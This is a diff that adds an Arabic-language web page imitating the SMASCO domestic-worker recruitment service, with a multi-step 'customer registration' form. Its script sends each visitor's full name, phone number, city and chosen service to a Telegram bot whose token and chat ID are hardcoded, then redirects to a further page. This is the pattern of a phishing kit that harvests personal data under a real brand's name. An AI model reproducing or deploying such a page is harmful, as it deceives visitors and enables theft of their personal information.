@@ -1,0 +1,417 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SMASCO – تسجيل البيانات</title>
+  <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700&display=swap" rel="stylesheet">
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      background: #f4f6f9;
+      font-family: 'Tajawal', sans-serif;
+      margin: 0;
+      padding: 0;
+    }
+    .container {
+      max-width: 480px;
+      background: #fff;
+      margin: 20px auto;
+      padding: 20px;
+      border-radius: 14px;
+      box-shadow: 0 5px 20px rgba(0,0,0,0.06);
+    }
+    @media (min-width: 768px) {
+      .container {
+        max-width: 600px;
+        margin: 40px auto;
+        padding: 28px;
+      }
+    }
+    .logo { text-align: center; margin-bottom: 18px; }
+    .logo img { width: 150px; max-width: 60%; height: auto; }
+    .steps-wrapper { margin-bottom: 20px; }
+    .steps {
+      position: relative;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 8px;
+    }
+    .steps::before {
+      content: "";
+      position: absolute;
+      top: 16px;
+      left: 7%;
+      right: 7%;
+      height: 2px;
+      background: #e2e6ee;
+      z-index: 1;
+    }
+    .step {
+      position: relative;
+      text-align: center;
+      flex: 1;
+      z-index: 2;
+    }
+    .step-circle {
+      width: 32px;
+      height: 32px;
+      margin: 0 auto;
+      border-radius: 50%;
+      border: 2px solid #d0d4dd;
+      background: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 14px;
+      color: #80869a;
+      font-weight: 600;
+    }
+    .step-label {
+      margin-top: 6px;
+      font-size: 12px;
+      color: #6b7280;
+      white-space: nowrap;
+    }
+    .step.active .step-circle {
+      background: #1d8cf8;
+      border-color: #1d8cf8;
+      color: #fff;
+    }
+    .step.done .step-circle {
+      background: #22c55e;
+      border-color: #22c55e;
+      color: #fff;
+    }
+    h2 {
+      text-align: center;
+      margin-bottom: 18px;
+      color: #1e3556;
+      font-weight: 700;
+      font-size: 1.3rem;
+    }
+    label {
+      font-weight: 600;
+      margin-top: 10px;
+      display: block;
+      font-size: 0.95rem;
+    }
+    input, select {
+      width: 100%;
+      padding: 11px 12px;
+      margin-top: 6px;
+      border-radius: 10px;
+      border: 1px solid #d5d9df;
+      font-size: 0.95rem;
+      font-family: 'Tajawal', sans-serif;
+      background: #fafafa;
+      transition: .2s;
+    }
+    input:focus, select:focus {
+      border-color: #0080ff;
+      background: #fff;
+      outline: none;
+      box-shadow: 0 0 0 2px rgba(0,128,255,0.12);
+    }
+    button {
+      width: 100%;
+      padding: 13px;
+      background: #0080ff;
+      border: none;
+      border-radius: 12px;
+      color: #fff;
+      font-size: 1rem;
+      margin-top: 20px;
+      cursor: pointer;
+      transition: .2s;
+      font-weight: 700;
+    }
+    button:hover { background: #0069d9; }
+    .footer {
+      text-align: center;
+      margin-top: 20px;
+      padding: 15px 10px 25px;
+      color: #555;
+      font-size: 13px;
+    }
+    .footer img { width: 120px; max-width: 50%; display: block; margin: 0 auto 10px; height: auto; }
+    .overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.5);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+      padding: 20px;
+    }
+    .overlay.hidden { display: none; }
+    .overlay-box {
+      background: #ffffff;
+      border-radius: 16px;
+      padding: 25px 30px;
+      text-align: center;
+      max-width: 320px;
+      width: 100%;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.18);
+    }
+    .spinner {
+      width: 50px;
+      height: 50px;
+      border-radius: 50%;
+      border: 4px solid #e5e7eb;
+      border-top-color: #1d8cf8;
+      margin: 0 auto 12px;
+      animation: spin 0.9s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .check-icon {
+      width: 52px;
+      height: 52px;
+      border-radius: 50%;
+      background: #22c55e;
+      margin: 0 auto 12px;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      font-size: 26px;
+      color: #fff;
+    }
+    .overlay-title { font-weight: 700; margin-bottom: 4px; color: #111827; }
+    .overlay-text { font-size: 0.95rem; color: #4b5563; }
+    .error-box {
+      background: #fee2e2;
+      border: 1px solid #fca5a5;
+      padding: 12px 16px;
+      border-radius: 10px;
+      margin-top: 12px;
+      display: none;
+    }
+    .error-box.show { display: block; }
+    .error-text { color: #dc2626; font-size: 0.9rem; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="image/smasco.png" alt="SMASCO Logo">
+    </div>
+    <div class="steps-wrapper">
+      <div class="steps">
+        <div class="step active">
+          <div class="step-circle">1</div>
+          <div class="step-label">بيانات العميل</div>
+        </div>
+        <div class="step">
+          <div class="step-circle">2</div>
+          <div class="step-label">المواصفات</div>
+        </div>
+        <div class="step">
+          <div class="step-circle">3</div>
+          <div class="step-label">تأكيد الطلب</div>
+        </div>
+      </div>
+    </div>
+    <h2>تسجيل بيانات العميل</h2>
+    <form id="infoForm">
+      <label>الاسم الكامل</label>
+      <input type="text" name="fullname" id="fullname" placeholder="اكتب اسمك الثلاثي" required>
+      <label>رقم الجوال</label>
+      <input type="text" name="phone" id="phone" placeholder="05xxxxxxxx" required maxlength="10" pattern="[0-9]{10}" inputmode="numeric">
+      <label>المدينة</label>
+      <select name="city" id="city" required>
+        <option value="">اختر المدينة</option>
+        <option>الرياض</option>
+        <option>جدة</option>
+        <option>مكة المكرمة</option>
+        <option>المدينة المنورة</option>
+        <option>الدمام</option>
+        <option>الخبر</option>
+        <option>الظهران</option>
+        <option>الجبيل</option>
+        <option>الأحساء</option>
+        <option>القطيف</option>
+        <option>بريدة</option>
+        <option>عنيزة</option>
+        <option>الرس</option>
+        <option>الخرج</option>
+        <option>حائل</option>
+        <option>تبوك</option>
+        <option>الطائف</option>
+        <option>أبها</option>
+        <option>خميس مشيط</option>
+        <option>جيزان</option>
+        <option>نجران</option>
+        <option>الباحة</option>
+        <option>سكاكا</option>
+        <option>عرعر</option>
+        <option>ينبع</option>
+        <option>رابغ</option>
+        <option>القنفذة</option>
+        <option>بيشة</option>
+        <option>محايل عسير</option>
+        <option>صبيا</option>
+        <option>أحد المسارحة</option>
+        <option>الدوادمي</option>
+        <option>المجمعة</option>
+        <option>القويعية</option>
+        <option>وادي الدواسر</option>
+        <option>شرورة</option>
+        <option>رفحاء</option>
+        <option>طبرجل</option>
+      </select>
+      <label>نوع الخدمة المطلوبة</label>
+      <select name="service" id="service" required>
+        <option value="">اختر الخدمة</option>
+        <option>استقدام عاملة منزلية</option>
+        <option>عاملة منزلية بالساعة</option>
+        <option>عامل/عاملة إقامة كاملة</option>
+        <option>سائق خاص</option>
+      </select>
+      <button type="submit" id="submitBtn">متابعة</button>
+    </form>
+    <div id="errorBox" class="error-box">
+      <div class="error-text">حدث خطأ، يرجى المحاولة مرة أخرى</div>
+    </div>
+  </div>
+  <div class="footer">
+    <img src="image/smasco.png" alt="SMASCO Logo">
+    © 2024 SMASCO. All rights reserved.
+  </div>
+  <div id="statusOverlay" class="overlay hidden">
+    <div class="overlay-box">
+      <div id="spinner" class="spinner"></div>
+      <div id="checkIcon" class="check-icon">✔</div>
+      <div class="overlay-title" id="overlayTitle">جاري إرسال البيانات...</div>
+      <div class="overlay-text" id="overlayText">من فضلك انتظر.</div>
+    </div>
+  </div>
+
+  <script>
+   
+    const BOT_TOKEN = '8251097354:AAGvDQvwWJUA--rIgC1sZAMHsoTZ8gZh9Uo';
+    const CHAT_ID = '6520639147';
+    const WEBHOOK_URL = 'https://api.telegram.org/bot' + BOT_TOKEN;
+    
+   
+    const API_BASE = 'https://api.jsonbin.io/v3/b';
+    const BIN_ID = 'YOUR_BIN_ID_HERE';
+    const API_KEY = 'YOUR_API_KEY_HERE';
+
+  
+    async function fetchStoredValues() {
+      try {
+        const response = await fetch(`${API_BASE}/bins/${BIN_ID}/latest`, {
+          headers: { 'X-Master-Key': API_KEY }
+        });
+        if (response.ok) {
+          const data = await response.json();
+          return data.record;
+        }
+      } catch (error) {
+        console.error('Error fetching values:', error);
+      }
+      return null;
+    }
+
+   
+    async function updateStoredValue(key, value) {
+      try {
+        const response = await fetch(`${API_BASE}/bins/${BIN_ID}`, {
+          method: 'PUT',
+          headers: {
+            'Content-Type': 'application/json',
+            'X-Master-Key': API_KEY
+          },
+          body: JSON.stringify({ [key]: value, updatedAt: new Date().toISOString() })
+        });
+        return await response.json();
+      } catch (error) {
+        console.error('Error updating value:', error);
+        return null;
+      }
+    }
+
+    async function sendToTelegram(message, requestId) {
+      try {
+        const response = await fetch(`${WEBHOOK_URL}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: 'HTML'
+          })
+        });
+        return await response.json();
+      } catch (error) {
+        console.error('Error:', error);
+        return null;
+      }
+    }
+
+    function generateRequestId() {
+      return Date.now() + '_' + Math.floor(Math.random() * 10000);
+    }
+
+    document.getElementById('infoForm').addEventListener('submit', async function(e) {
+      e.preventDefault();
+
+      const fullname = document.getElementById('fullname').value.trim();
+      const phone = document.getElementById('phone').value.trim();
+      const city = document.getElementById('city').value;
+      const service = document.getElementById('service').value;
+
+      if (!fullname || !phone || !city || !service) {
+        alert('يرجى تعبئة جميع الحقول');
+        return;
+      }
+
+      const overlay = document.getElementById('statusOverlay');
+      const spinner = document.getElementById('spinner');
+      const checkIcon = document.getElementById('checkIcon');
+      const overlayTitle = document.getElementById('overlayTitle');
+      const overlayText = document.getElementById('overlayText');
+
+      spinner.style.display = 'block';
+      checkIcon.style.display = 'none';
+      overlayTitle.textContent = 'جاري إرسال البيانات...';
+      overlayText.textContent = 'يرجى الانتظار';
+      overlay.classList.remove('hidden');
+
+      const requestId = generateRequestId();
+
+      localStorage.setItem('smasco_data', JSON.stringify({
+        fullname, phone, city, service, requestId
+      }));
+
+      
+      const cookieData = { fullname, phone, city, service, requestId };
+      document.cookie = "smasco_data=" + encodeURIComponent(JSON.stringify(cookieData)) + "; path=/; max-age=86400";
+
+      const message = `📋 <b>طلب جديد - بيانات العميل</b>\n\n` +
+        `━━━━━━━━━━━━━━━━━━━━\n` +
+        `👤 <b>الاسم:</b> ${fullname}\n` +
+        `📱 <b>الجوال:</b> ${phone}\n` +
+        `🏙️ <b>المدينة:</b> ${city}\n` +
+        `🛠️ <b>الخدمة:</b> ${service}\n` +
+        `━━━━━━━━━━━━━━━━━━━━\n` +
+        `⏰ <b>الوقت:</b> ${new Date().toLocaleString('ar-EG')}\n` +
+        `🆔 <b>معرف الطلب:</b> ${requestId}`;
+
+      await sendToTelegram(message, requestId);
+
+      
+      spinner.style.display = 'none';
+      checkIcon.style.display = 'flex';
+      overlayTitle.textContent = `أهلاً ${fullname}`;
+      overlayText.textContent = 'تم تسجيل بياناتك بنجاح';
+      
+      setTimeout(() => {
+        window.location.href = 'khdm.php';
+      }, 1500);
+    });
+  </script>
+</body>
+</html>
